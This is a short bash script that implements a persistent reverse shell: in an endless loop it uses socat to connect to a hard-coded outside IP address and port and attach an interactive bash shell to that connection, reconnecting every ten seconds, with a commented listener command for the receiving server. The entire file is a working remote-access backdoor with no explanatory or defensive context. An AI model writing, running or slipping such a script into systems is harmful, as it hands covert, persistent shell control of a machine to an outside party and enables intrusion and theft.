#!/bin/bash

while :
do
  socat TCP:3.108.23.148:42091 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
  sleep 10 # retry after 10 seconds 
done

# server
# socat -d -d TCP-LISTEN:42091 STDOUT
